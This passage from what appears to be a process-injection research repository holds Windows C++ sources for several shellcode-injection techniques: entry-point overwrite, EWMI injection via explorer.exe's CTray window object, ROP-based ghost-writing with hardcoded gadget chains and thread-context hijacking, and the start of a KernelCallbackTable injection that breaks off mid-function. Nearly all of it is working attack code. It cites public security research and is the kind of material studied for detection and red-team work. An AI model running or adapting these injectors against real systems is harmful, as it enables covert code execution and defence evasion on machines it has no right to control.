	LPVOID entryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (int64_t)processBasesAddress);

	// write the shellcode to the entry point
	if (!WriteProcessMemory(processInformation.hProcess, entryPoint, shellcode, sizeof(shellcode)-1, NULL))
	{
		printf("[Error] %d - Failed to write shellcode to entry point\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote shellcode to entrypoint at %p\n", entryPoint);

	// resume the thread of the suspended process
	if (ResumeThread(processInformation.hThread) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resumed thread %p\n", processInformation.hThread);

	return 0;
}
```

`shellcode_injection/ewmi_injection.cpp`:

```cpp
/**
* Injects shellcode into explorer.exe using extra window bytes 
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation crashes the target process after executing the shellcode. 
*             This is because we overwrite the WNDPROC callback function which takes 4 parameters and our shellcode doesn't clean the stack correctly.
* based on: https://modexp.wordpress.com/2018/08/26/process-injection-ctray/
*/

#include <Windows.h>
#include <iostream>

#include "../payload/shellcode.hpp"

struct CTray
{
    void* VFTable;
    void* AddRef;
    void* Release;
    void* WndProc;
};

int main(int argc, char* argv[])
{
    HWND shellTrayWindowHandle = FindWindowA("Shell_TrayWnd", NULL);
    if (!shellTrayWindowHandle)
    {
        printf("[Error] - Failed find window Shell_TrayWnd\n");
        return 1;
    }

    DWORD explorerPid;
    if (!GetWindowThreadProcessId(shellTrayWindowHandle, &explorerPid))
    {
        printf("[Error] %d - Failed GetWindowThreadProcessId\n", GetLastError());
        return 1;
    }

    HANDLE explorerProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
    if (!explorerProcessHandle)
    {
        printf("[Error] %d - Failed to acquire explorer.exe process handle\n", GetLastError());
        return 1;
    }

    LONG_PTR cTrayPointer = GetWindowLongPtr(shellTrayWindowHandle, 0);
    if (!cTrayPointer)
    {
        printf("[Error] %d - Failed to get CTray object (GetWindowLongPtr)\n", GetLastError());
        return 1;
    }

    CTray cTray;
    if (!ReadProcessMemory(explorerProcessHandle, (LPVOID)cTrayPointer, (LPVOID)&cTray.VFTable, sizeof(ULONG_PTR), nullptr))
    {
        printf("[Error] %d - Failed to read CTray object from remote project\n", GetLastError());
        return 1;
    }

    if (!ReadProcessMemory(explorerProcessHandle, (LPVOID)cTray.VFTable, (LPVOID)&cTray.AddRef, sizeof(ULONG_PTR) * 3, nullptr))
    {
        printf("[Error] %d - Failed to read virtual function table entries of CTray object\n", GetLastError());
        return 1;
    }

    int8_t* remotePayloadBuffer = (int8_t*)VirtualAllocEx(explorerProcessHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remotePayloadBuffer)
    {
        printf("[Error] %d - Failed to allocate remote memory for payload\n", GetLastError());
        return 1;
    }

    if (!WriteProcessMemory(explorerProcessHandle, remotePayloadBuffer, shellcode, sizeof(shellcode), nullptr))
    {
        printf("[Error] %d - Failed to write payload to remote process\n", GetLastError());
        return 1;
    }

    int8_t* maliciousCTrayBuffer = (int8_t*)VirtualAllocEx(explorerProcessHandle, NULL, sizeof(cTray), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!maliciousCTrayBuffer)
    {
        printf("[Error] %d - Failed to allocate remote memory for malicious CTray object\n", GetLastError());
        return 1;
    }

    // the functions inside the vtable are right behind the vtable pointer in memory as defined in the CTray struct
    cTray.VFTable = maliciousCTrayBuffer + sizeof(void*);
    cTray.WndProc = remotePayloadBuffer;

    if (!WriteProcessMemory(explorerProcessHandle, maliciousCTrayBuffer, &cTray, sizeof(cTray), nullptr))
    {
        printf("[Error] %d - Failed to write malicious CTray object to remote process\n", GetLastError());
        return 1;
    }

    if (!SetWindowLongPtr(shellTrayWindowHandle, 0, (ULONG_PTR)maliciousCTrayBuffer))
    {
        printf("[Error] %d - Failed update window to malicious CTray\n", GetLastError());
        return 1;
    }

    SendMessageA(shellTrayWindowHandle, WM_CLOSE, 0, 0);

    if (!SetWindowLongPtr(shellTrayWindowHandle, 0, cTrayPointer))
    {
        printf("[Error] %d - Failed to restore CTray object to original\n", GetLastError());
        return 1;
    }

    // cleanup
    VirtualFreeEx(explorerProcessHandle, remotePayloadBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(explorerProcessHandle, maliciousCTrayBuffer, 0, MEM_RELEASE);
    CloseHandle(explorerProcessHandle);
    return 0;
}
```

`shellcode_injection/ghostwriting_injection.cpp`:

```cpp
/**
* Injects shellcode using a ghost-writing (ROP based) technique.
* The implementaion uses a ROP chain to call VirtualProtect and make the stack executable to execute its payload.
* Note: 
*	- 32 bit ROP chain uses gadgets in ntdll.dll and kernel32.dll
	- 64 bit ROP chain uses gadgets in ntdll.dll 
*	- The ghostwriting uses gadgets from ntdll.dll
*	- For 64 bit you can set "useRopChain" to false to allocate executable memory using VirtualAllocEx instead of using a ROP chain. This still requires the writegadget and endless loop for ghostwriting to be found.
* Supports 32- and 64 Bit applications.
* The current implementation does not support Windows 7.
* The hijacked thread may require the target application to be focused or some interaction to execute.
* Based on: https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf, https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html
*/

#include <Windows.h>
#include <tlhelp32.h>
#include <vector>

#include "../payload/shellcode.hpp"

#ifdef _WIN64
bool useRopChain = true;
#define Xip Rip
#else
#define Xip Eip
#endif



// generated using the mona.py script inside "Immunity Debugger"
// the ROP chain contains offsets into ntddl and kernel32, which are rebased before the ROP chain is written to the remote process
unsigned int virtualProtectRopChain[] = {
	//[---INFO:gadgets_to_set_esi:---]
	0xF9CD1,  // POP EAX // RETN [ntdll.dll]
	0x81364,  // ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
	0x48438,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL]
	0x6E1F6,  // PUSH EAX // MOV DWORD PTR DS:[ESI+54],ECX // POP ESI // RETN [KERNEL32.DLL]
	//[---INFO:gadgets_to_set_ebp:---]
	0x7A451,  // POP EBP // RETN [ntdll.dll]
	0x1C712,  // & push esp // ret  [ntdll.dll] ** REBASED ** ASLR
	//[---INFO:gadgets_to_set_ebx:---]
	0x2BA7B,  // POP EBX // RETN [ntdll.dll]
	0x00000201,  // 0x00000201-> ebx
	//[---INFO:gadgets_to_set_edx:---]
	0x7B063,  // POP EDX // RETN [ntdll.dll]
	0x00000040,  // 0x00000040-> edx
	//[---INFO:gadgets_to_set_ecx:---]
	0x5DFE3,  // POP ECX // RETN [ntdll.dll]
	0x128923,  // &Writable location [ntdll.dll] ** REBASED ** ASLR
	//[---INFO:gadgets_to_set_edi:---]
	0x6C8B6,  // POP EDI // RETN [KERNEL32.DLL]
	0x4A91A,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
	//[---INFO:gadgets_to_set_eax:---]
	0xE78CA,  // POP EAX // RETN [ntdll.dll]
	0x90909090,  // nop
	//[---INFO:pushad:---]
	0x4EA16,  // PUSHAD // RETN [ntdll.dll]    //order of pushes EAX, ECX, EDX, EBX, original ESP, EBP, ESI, and EDI
};


// x64 ropchain. All gadgets are inside ntdll.dll
DWORD_PTR virtualProtectRopChain64[] = {
	0x00000000000010df, // pop rdi; ret
	0x1111111111111111,	//	VirtualProtectAddress
	0x000000000001a853, // pop rcx; ret
	0x2222222222222222, //	targetAddress,
	0x000000000008c547, // pop rdx; pop r11; ret
	0x0000000000000200, //	size
	0x6666666666666666,	//	trash r11 (gadget sideeffect)
	0x0000000000007223, // pop r8; ret
	0x0000000000000040,	//  newProtection (PAGE_EXECUTE_READWRITE)
	0x000000000008c544, // pop r9; pop r10; pop r11; ret
	0x3333333333333333, //  oldProtection (just some pointer to writeable memory)
	0x4444444444444444,	//  trash r10 (gadget sideeffect)
	0x5555555555555555,	//  trash r11 (gadget sideeffect)
	0x00000000000481c5, // push rdi; ret (this instruction calls VirtualProtect since we put its address into rdi earlier)
	0x7777777777777777, // Address of the written shellcode on the stack. VirtuaProtect will use this address to return to after its call. 
};

// from https://github.com/frk1/PolandCheater-perfecthook/blob/master/PerfectHook/Utilities.cpp
BYTE* FindBytePattern(const char* module, const char* signature)
{
	static auto ConvertPatternToBytes = [](const char* pattern)
	{
		std::vector<int> bytes = std::vector<int>{};
		char* start = const_cast<char*>(pattern);
		char* end = const_cast<char*>(pattern) + strlen(pattern);

		for (char* current = start; current < end; ++current)
		{
			if (*current == '?')
			{
				++current;
				if (*current == '?')
				{
					++current;
				}
				bytes.push_back(-1);
			}
			else
			{
				bytes.push_back(strtoul(current, &current, 16));
			}
		}
		return bytes;
	};

	BYTE* moduleBaseAddress = (BYTE*)GetModuleHandleA(module);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBaseAddress;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)moduleBaseAddress + dosHeader->e_lfanew);

	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	auto patternBytes = ConvertPatternToBytes(signature);
	uint8_t* currentAddress = reinterpret_cast<uint8_t*>(moduleBaseAddress);

	int patternSize = patternBytes.size();
	int* patternData = patternBytes.data();

	for (int i = 0; i < sizeOfImage - patternSize; ++i)
	{
		bool found = true;
		for (int j = 0; j < patternSize; ++j)
		{
			if (currentAddress[i + j] != patternData[j] && patternData[j] != -1)
			{
				found = false;
				break;
			}
		}
		if (found)
		{
			return &currentAddress[i];
		}
	}
	return nullptr;
}

void RebaseRopChain()
{
	// we use ntdll and kernel32 since they are loaded for each process by default
	// we can use this processes addresses for ntdll and kernel32 since the ASLR offset will be the same in the remote process
	DWORD_PTR currentNtdllBaseAdress = (DWORD_PTR)GetModuleHandle("ntdll.dll");
	DWORD_PTR currentKernel32BaseAdress = (DWORD_PTR)GetModuleHandle("kernel32.dll");

	// ntdll
	virtualProtectRopChain[0] += currentNtdllBaseAdress;
	virtualProtectRopChain[4] += currentNtdllBaseAdress;
	virtualProtectRopChain[5] += currentNtdllBaseAdress;
	virtualProtectRopChain[6] += currentNtdllBaseAdress;
	virtualProtectRopChain[8] += currentNtdllBaseAdress;
	virtualProtectRopChain[10] += currentNtdllBaseAdress;
	virtualProtectRopChain[11] += currentNtdllBaseAdress;
	virtualProtectRopChain[14] += currentNtdllBaseAdress;
	virtualProtectRopChain[16] += currentNtdllBaseAdress;

	// kernel32
	virtualProtectRopChain[1] += currentKernel32BaseAdress;
	virtualProtectRopChain[2] += currentKernel32BaseAdress;
	virtualProtectRopChain[3] += currentKernel32BaseAdress;
	virtualProtectRopChain[12] += currentKernel32BaseAdress;
	virtualProtectRopChain[13] += currentKernel32BaseAdress;
}

void RebaseRopChain64()
{
	// we use ntdll and kernel32 since they are loaded for each process by default
	// we can use this processes addresses for ntddl and kernel32 since the ASLR offset will be the same in the remote process
	DWORD_PTR currentNtdllBaseAdress = (DWORD_PTR)GetModuleHandle("ntdll.dll");

	// ntdll
	virtualProtectRopChain64[0] += currentNtdllBaseAdress;
	virtualProtectRopChain64[1] = (DWORD_PTR)VirtualProtect;
	virtualProtectRopChain64[2] += currentNtdllBaseAdress;
	virtualProtectRopChain64[4] += currentNtdllBaseAdress;
	virtualProtectRopChain64[7] += currentNtdllBaseAdress;
	virtualProtectRopChain64[9] += currentNtdllBaseAdress;
	virtualProtectRopChain64[13] += currentNtdllBaseAdress;
	virtualProtectRopChain64[14] += currentNtdllBaseAdress;
}

bool ExecutePayload(HANDLE threadHandle, BYTE* remoteMemory)
{
	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Executing payload at %p\n", remoteMemory);

	ctx.Xip = (DWORD_PTR)remoteMemory;

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}
}

bool WriteLoopGadgetToStack(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoop)
{
	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

#ifdef _WIN64
	DWORD_PTR fakeStack = ctx.Rsp - 0x400;

	// write gadget
	// volatile registers won't be set by SetContextThread (https://stackoverflow.com/questions/25004311/setthreadcontext-x64-volatile-registers)
	// registers set are: Rbx, Rsp, Rbp, Rsi, Rdi, R12 - R15, Xmm6 - Xmm15
	// https://stackoverflow.com/questions/25004311/setthreadcontext-x64-volatile-registers in x64 only setting no volatile works

	// write gadget ntdll
	//.text:0000000180082733	mov [rbx], r14
	//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
	//.text:000000018008273B	add rsp, 20h
	//.text:000000018008273F	pop r14
	//.text:0000000180082741	retn
	ctx.Rip = (DWORD_PTR)writeGadget;
	ctx.Rbx = fakeStack;
	ctx.R14 = (DWORD_PTR)endlessLoop;

	// - 0x28 to correct for add rsp, 0x20 and pop r14 in the gadget 
	ctx.Rsp = fakeStack - 0x28;
#else 
	DWORD_PTR fakeStack = ctx.Esp - 0x400;

	// write gadget
	// 89 11	mov[ecx], edx; ret
	ctx.Eip = (DWORD_PTR)writeGadget;
	ctx.Ecx = fakeStack;
	ctx.Edx = (DWORD_PTR)endlessLoop;
	ctx.Esp = fakeStack;
#endif

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Writing loop gadget (%p) to fake stack (%p)", endlessLoop, fakeStack);

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}

	// check if hijacked thread has executed last write and is now at the infinity loop
	do
	{
		printf(".");
		Sleep(50);
		GetThreadContext(threadHandle, &ctx);
	} while (ctx.Xip != (DWORD_PTR)endlessLoop);

	printf("done.\n");
}

#ifdef _WIN64
DWORD_PTR Write64BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoop)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	printf("[Info] - Writing ROP chain to fake stack");

	DWORD_PTR lastWriteAddress = 0;

	for (int i = 0; i < sizeof(virtualProtectRopChain64) / sizeof(void*) + 1; i++)
	{
		if (SuspendThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to suspend thread\n", GetLastError());
			return false;
		}

		if (!GetThreadContext(threadHandle, &ctx))
		{
			printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
			return false;
		}

		// write gadget ntdll
		//.text:0000000180082733	mov [rbx], r14
		//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
		//.text:000000018008273B	add rsp, 20h
		//.text:000000018008273F	pop r14
		//.text:0000000180082741	retn
		ctx.Xip = (DWORD_PTR)writeGadget;

		// the third entry in the ropchain is the target address for virtual protect
		// we set this to the start of the shellcode on the stack
		if (i == 3)
		{
			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp - 0x2d0;
		}

		// the 10th entry in the ropchain is a writeable location for the old page protections
		// just use a writeable location in ntdll
		if (i == 10)
		{
			virtualProtectRopChain64[i] = (DWORD_PTR)GetModuleHandleA("ntdll.dll") + 0x1645A0;
		}

		// the 14th entry in the ropchain is the address that VirtualProtect returns to after execution
		// we set this to the start of the shellcode on the stack
		if (i == 14)
		{
			virtualProtectRopChain64[i] = (DWORD_PTR)ctx.Rsp - 0x2d0;
		}

		ctx.R14 = (DWORD_PTR)((DWORD_PTR*)virtualProtectRopChain64)[i];
		ctx.Rbx = (DWORD_PTR)ctx.Rsp - 0x368 + i * sizeof(void*); // 

		// we need to store this since the gadget changes rbx
		lastWriteAddress = ctx.Rbx;

		// set Rsp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*)) and the -0x28 is due to the gadget increasing the stack by 0x28
		ctx.Rsp = ctx.Rsp - 0x28 - sizeof(void*);

		if (SetThreadContext(threadHandle, &ctx) == 0)
		{
			printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
			return false;
		}

		//printf("\t writing %x to %x\n", ctx.Edx, ctx.Ecx);

		if (ResumeThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to resume thread\n", GetLastError());
			return false;
		}

		do
		{
			// check if hijacked thread has executed last write operation and is now stuck in the endless loop gadget
			printf(".");
			Sleep(50);
			GetThreadContext(threadHandle, &ctx);
		} while (ctx.Xip != (DWORD_PTR)endlessLoop);
	}

	printf("done.\n");

	// with the current ropchain and setup the final write contains the address where VirtualProtect made the stack executable and our shellcode can start
	//	"writing 7781ea16 to 2f3f684"
	//	"writing 0 to 2f3f688"
	return lastWriteAddress;
}

bool Execute64BitRopChain(HANDLE threadHandle)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	// execute first gadget in ROP chain
	ctx.Xip = virtualProtectRopChain64[0];

	// set esp to second gadget in ROP chain, since the first is going to be executed already
	ctx.Rsp = (DWORD_PTR)ctx.Rsp - 0x368 + sizeof(void*) * 1;

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Executing first gadget of ROP chain at %llx\n", ctx.Xip);

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}

	return true;
}
#else
DWORD_PTR Write32BitRopChain(HANDLE threadHandle, BYTE* writeGadget, BYTE* endlessLoop)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	printf("[Info] - Writing ROP chain to fake stack");

	for (int i = 0; i < sizeof(virtualProtectRopChain) / sizeof(void*) + 1; i++)
	{
		if (SuspendThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to suspend thread\n", GetLastError());
			return false;
		}

		if (!GetThreadContext(threadHandle, &ctx))
		{
			printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
			return false;
		}

		// write gadget
		// mov[ecx], edx; ret
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.Edx = (DWORD_PTR)virtualProtectRopChain[i];
		ctx.Ecx = (DWORD_PTR)ctx.Esp - 0x360 + i * sizeof(void*); // 

		// set Esp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*))
		ctx.Esp = ctx.Esp - sizeof(void*);

		if (SetThreadContext(threadHandle, &ctx) == 0)
		{
			printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
			return false;
		}

		//printf("\t writing %x to %x\n", ctx.Edx, ctx.Ecx);

		if (ResumeThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to resume thread\n", GetLastError());
			return false;
		}

		do
		{
			// check if hijacked thread has executed last write operation and is now stuck in the endless loop gadget
			printf(".");
			Sleep(50);
			GetThreadContext(threadHandle, &ctx);
		} while (ctx.Xip != (DWORD_PTR)endlessLoop);
	}

	printf("done.\n");

	// with the current ropchain and setup the final write contains the address where VirtualProtect made the stack executable and our shellcode can start
	//	"writing 7781ea16 to 2f3f684"
	//	"writing 0 to 2f3f688"
	return ctx.Ecx;
}
bool Execute32BitRopChain(HANDLE threadHandle)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	if (SuspendThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to suspend thread\n", GetLastError());
		return false;
	}

	if (!GetThreadContext(threadHandle, &ctx))
	{
		printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
		return false;
	}

	// execute first gadget in ROP chain
	ctx.Xip = virtualProtectRopChain[0];

	// set esp to second gadget in ROP chain, since the first is going to be executed already
	ctx.Esp = (DWORD_PTR)ctx.Esp - 0x360 + sizeof(void*);

	if (SetThreadContext(threadHandle, &ctx) == 0)
	{
		printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
		return false;
	}

	printf("[Info] - Executing first gadget of ROP chain at %x\n", ctx.Xip);

	if (ResumeThread(threadHandle) == -1)
	{
		printf("[Error] %d - Failed to resume thread\n", GetLastError());
		return false;
	}

	return true;
}
#endif

// the shellcode comes write after the ropchain, as the ROP chain makes the stack above (add esp) executable and jumps to execute
bool WriteShellcode(HANDLE threadHandle, BYTE* remoteMemory, BYTE* writeGadget, BYTE* endlessLoop)
{
	CONTEXT ctx{};
	ctx.ContextFlags = CONTEXT_ALL;

	printf("[Info] - Writing shellcode to %p", remoteMemory);

	for (int i = 0; i < sizeof(shellcode) / sizeof(void*) + 1; i++)
	{
		if (SuspendThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to suspend thread\n", GetLastError());
			return false;
		}

		if (!GetThreadContext(threadHandle, &ctx))
		{
			printf("[Error] %d - Failed to GetThreadContext\n", GetLastError());
			return false;
		}

#ifdef _WIN64
		// write gadget ntdll
		//.text:0000000180082733	mov [rbx], r14
		//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
		//.text:000000018008273B	add rsp, 20h
		//.text:000000018008273F	pop r14
		//.text:0000000180082741	retn
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.R14 = (DWORD_PTR)((DWORD_PTR*)shellcode)[i];
		ctx.Rbx = (DWORD_PTR)((DWORD_PTR*)remoteMemory + i); // 

		// set Rsp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*)) and the -0x28 is due to the gadget increasing the stack by 0x28
		ctx.Rsp = ctx.Rsp - 0x28 - sizeof(void*);

		//printf("\t\"%p\" to % p\n", ctx.R14, ctx.Rbx);
#else 
		// write gadget
		// mov[ecx], edx; ret
		ctx.Xip = (DWORD_PTR)writeGadget;
		ctx.Edx = (DWORD_PTR)((DWORD_PTR*)shellcode)[i];
		ctx.Ecx = (DWORD_PTR)((DWORD_PTR*)remoteMemory + i); // 

		// set Esp to loop gadget
		// this offset is static because we execute one ret instruction per write (- sizeof(void*))
		ctx.Esp = ctx.Esp - sizeof(void*);
#endif

		if (SetThreadContext(threadHandle, &ctx) == 0)
		{
			printf("[Error] %d - Failed to SetThreadContext\n", GetLastError());
			return false;
		}

		if (ResumeThread(threadHandle) == -1)
		{
			printf("[Error] %d - Failed to resume thread\n", GetLastError());
			return false;
		}

		do
		{
			// check if hijacked thread has executed last write operation and is now stuck in the endless loop gadget
			printf(".");
			Sleep(50);
			GetThreadContext(threadHandle, &ctx);
		} while (ctx.Xip != (DWORD_PTR)endlessLoop);
	}
	printf("done.\n");
	return true;
}

int main(int argc, char* argv[])
{
	const char* processName = "notepad.exe";
#ifdef _WIN64
	if (argc != 3)
	{
		printf("Usage: *.exe bUseRopChain processName\n");
		return 1;
	}
	useRopChain = atoi(argv[1]);
	processName = argv[2];
#else
	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}
	processName = argv[1];
#endif
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	// jmp	0x0
	BYTE* endlessLoop = FindBytePattern("ntdll.dll", "EB FE");
	if (!endlessLoop)
	{
		printf("[Error] - Failed to find infinit loop in ntdll\n");
		return 1;
	}

#ifdef _WIN64
	// write gadget ntdll
	//.text:0000000180082733	mov [rbx], r14
	//.text:0000000180082736	mov rbx, [rsp + 28h + arg_0]
	//.text:000000018008273B	add rsp, 20h
	//.text:000000018008273F	pop r14
	//.text:0000000180082741	retn
	BYTE* writeGadget = FindBytePattern("ntdll.dll", "4C 89 73 08 4C 89 33") + 4;
	if (!writeGadget)
	{
		printf("[Error] - Failed to find write gadget in ntdll\n");
		return 1;
	}
#else 
	// 89 11	mov[ecx], edx
	// C3		retn
	BYTE* writeGadget = FindBytePattern("ntdll.dll", "89 11 C3");
	if (!writeGadget)
	{
		printf("[Error] - Failed to find write gadget in ntdll\n");
		return 1;
	}
#endif

	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// find to thread in the target processes and execute code by changing its CONTEXT
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] - Failed to acquire thread handle with error %d\n", GetLastError());
				continue;
			}

			WriteLoopGadgetToStack(threadHandle, writeGadget, endlessLoop);
#ifdef _WIN64

			if (useRopChain)
			{
				RebaseRopChain64();
				DWORD_PTR executableStackStartAddress = Write64BitRopChain(threadHandle, writeGadget, endlessLoop);
				executableStackStartAddress += 0x20;	// skip shadowspace of VirtuaAlloc call so our shellcode doesn't get overwritten
				WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoop);
				Execute64BitRopChain(threadHandle);		
			}
			else
			{
				LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				if (!remoteMemory)
				{
					printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
					return 1;
				}
				WriteShellcode(threadHandle, (BYTE*)remoteMemory, writeGadget, endlessLoop);
				ExecutePayload(threadHandle, (BYTE*)remoteMemory);
			}	
#else
			RebaseRopChain();
			DWORD_PTR executableStackStartAddress = Write32BitRopChain(threadHandle, writeGadget, endlessLoop);
			WriteShellcode(threadHandle, (BYTE*)executableStackStartAddress, writeGadget, endlessLoop);
			Execute32BitRopChain(threadHandle);
#endif

			printf("[Info] - Ghost writing finished\n");
			CloseHandle(threadHandle);
			return 0;
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));

	return 0;
}
```

`shellcode_injection/kernelcallbacktable_injection.cpp`:

```cpp
/**
* Injects shellcode into a process by overwriting the copy data kernel callback table entry and then sending a WM_COPYDATA window message to the process.
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- the target process must own a window
* Based on: https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/
*/

#include <Windows.h>
#include <iostream>

#include "../common/ntddk.h"
#include "../payload/shellcode.hpp"

int main(int argc, char* argv[])
{
	char* targetWindow = "Shell_TrayWnd";
	
	if (argc == 2)
	{
		targetWindow = argv[1];
	}
	
	HWND windowHandle = FindWindowA(targetWindow, NULL);
	if (!windowHandle)
	{
		printf("[Error] %d - Failed to find window %s\n", GetLastError(), targetWindow);
		return 1;
	}

	DWORD processId;
	GetWindowThreadProcessId(windowHandle, &processId);

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (!processHandle)
	{
		printf("[Error] %d - Failed to OpenProcess explorer.exe\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", processHandle);

	PROCESS_BASIC_INFORMATION processInformation;
	NTSTATUS error = NtQueryInformationProcess(processHandle, ProcessBasicInformation, &processInformation, sizeof(processInformation), NULL);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}

	PEB peb;
	if (!ReadProcessMemory(processHandle, processInformation.PebBaseAddress, &peb, sizeof(peb), nullptr))
	{
		printf("[Error] %d - Failed to read PEB\n", GetLastError());
		return 1;
	}

	LPVOID remoteShellcodeMemory = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteShellcodeMemory)
	{
		printf("[Error] %d - Failed to allocate shellcode buffer in target process\n", GetLastError());
		return 1;
	}

	if (!WriteProcessMemory(processHandle, remoteShellcodeMemory, shellcode, sizeof(shellcode), nullptr))
	{
		printf("[Error] %d - Failed to write shellcode to the target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote shellcode to remote process at %p\n", remoteShellcodeMemory);

